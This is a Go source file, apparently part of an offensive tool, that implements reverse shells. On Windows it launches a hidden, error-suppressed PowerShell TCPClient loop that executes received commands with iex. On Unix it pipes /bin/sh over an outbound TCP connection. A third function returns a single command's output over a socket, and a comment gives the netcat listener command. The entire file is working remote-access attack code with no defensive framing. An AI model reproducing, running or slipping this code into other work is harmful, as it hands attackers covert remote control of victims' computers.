package main

import (
	"fmt"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// reverseShell connects back to addr (IP:PORT) and provides a persistent shell.
// Windows: PowerShell manages its own TCP I/O loop internally — reliable across
// NonInteractive sessions and raw sockets (no stdin/stdout pipe dependency).
// Linux/Mac: /bin/sh piped through the connection.
// Listener: nc -lvnp 4444
func reverseShell(addr string) {
	if runtime.GOOS == "windows" {
		reverseShellWindows(addr)
	} else {
		reverseShellUnix(addr)
	}
}

func reverseShellWindows(addr string) {
	parts := strings.SplitN(addr, ":", 2)
	if len(parts) != 2 {
		return
	}
	host, port := parts[0], parts[1]

	// Self-contained PS loop: PS opens its own TCPClient, reads commands,
	// executes via iex, sends back output + prompt. Survives NonInteractive.
	// [char]10 = newline (avoids Go raw-string backtick conflict).
	script := fmt.Sprintf(
		"$ErrorActionPreference='SilentlyContinue';"+
			"try{"+
			"$c=New-Object System.Net.Sockets.TCPClient('%s',%s);"+
			"$s=$c.GetStream();"+
			"[byte[]]$b=0..65535|%%{0};"+
			"while(($i=$s.Read($b,0,$b.Length)) -ne 0){"+
			"$d=([Text.Encoding]::UTF8).GetString($b,0,$i).Trim();"+
			"$o=try{iex $d 2>&1|Out-String}catch{'ERROR: '+$_.Exception.Message};"+
			"$r=$o+[char]10+'PS '+(Get-Location)+'> ';"+
			"$e=([Text.Encoding]::UTF8).GetBytes($r);"+
			"$s.Write($e,0,$e.Length);$s.Flush()"+
			"};$c.Close()"+
			"}catch{}",
		host, port)

	cmd := exec.Command("powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-Command", script)
	hideWindow(cmd)
	cmd.Run()
}

func reverseShellUnix(addr string) {
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	cmd := exec.Command("/bin/sh", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

// reverseShellCmd connects back and runs a single command, returning output over socket.
// Useful for non-interactive "exec and close" style callbacks.
func reverseShellCmd(addr, shellCmd string) {
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()

	out, _ := runShell(shellCmd)
	conn.Write([]byte(out))
}
